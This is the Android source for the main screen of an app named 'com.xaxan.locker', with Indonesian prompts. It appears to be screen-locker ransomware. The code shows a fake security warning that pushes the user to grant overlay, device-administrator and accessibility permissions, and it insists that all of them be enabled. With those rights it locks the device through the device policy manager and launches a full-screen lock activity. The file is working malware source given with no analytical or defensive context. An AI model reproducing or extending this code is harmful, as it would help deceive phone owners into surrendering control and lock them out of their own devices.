package com.xaxan.locker;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.provider.Settings;
import android.view.View;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {
    
    private static final int REQUEST_OVERLAY = 1001;
    private static final int REQUEST_ADMIN = 1002;
    private static final int REQUEST_ACCESS = 1003;
    
    private DevicePolicyManager dpm;
    private ComponentName admin;
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);
        
        setContentView(R.layout.activity_main);
        
        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        admin = new ComponentName(this, AdminReceiver.class);
        
        TextView tv = findViewById(R.id.tvMessage);
        Button btn = findViewById(R.id.btnGrant);
        
        tv.setText("⚠️ PERINGATAN KEAMANAN ⚠️\n\nAplikasi ini butuh akses LAYAR dan ADMIN. Klik IZINKAN untuk lanjut.");
        
        btn.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                mintaIzin();
            }
        });
        
        cekIzin();
    }
    
    private void mintaIzin() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (!Settings.canDrawOverlays(this)) {
                Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
                        Uri.parse("package:" + getPackageName()));
                startActivityForResult(i, REQUEST_OVERLAY);
                return;
            }
        }
        
        if (!dpm.isAdminActive(admin)) {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin);
            startActivityForResult(i, REQUEST_ADMIN);
            return;
        }
        
        if (!cekAkses()) {
            Intent i = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivityForResult(i, REQUEST_ACCESS);
            return;
        }
        
        lockSekarang();
    }
    
    private boolean cekAkses() {
        String service = getPackageName() + "/.LockService";
        try {
            String enabled = Settings.Secure.getString(getContentResolver(), 
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
            return enabled != null && enabled.contains(service);
        } catch (Exception e) {
            return false;
        }
    }
    
    private void cekIzin() {
        boolean overlay = true;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            overlay = Settings.canDrawOverlays(this);
        }
        
        if (overlay && dpm.isAdminActive(admin) && cekAkses()) {
            lockSekarang();
        }
    }
    
    private void lockSekarang() {
        Toast.makeText(this, "🔒 MENGUNCI PERANGKAT...", Toast.LENGTH_LONG).show();
        
        new Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                if (dpm.isAdminActive(admin)) {
                    dpm.lockNow();
                }
                
                Intent i = new Intent(MainActivity.this, LockScreenActivity.class);
                i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
                startActivity(i);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    finishAndRemoveTask();
                } else {
                    finish();
                }
            }
        }, 1500);
    }
    
    @Override
    protected void onActivityResult(int req, int res, Intent data) {
        super.onActivityResult(req, res, data);
        cekIzin();
        
        if (!dpm.isAdminActive(admin) || !cekAkses()) {
            Toast.makeText(this, "⚠️ SEMUA IZIN HARUS DIAKTIFKAN!", Toast.LENGTH_LONG).show();
        }
    }
}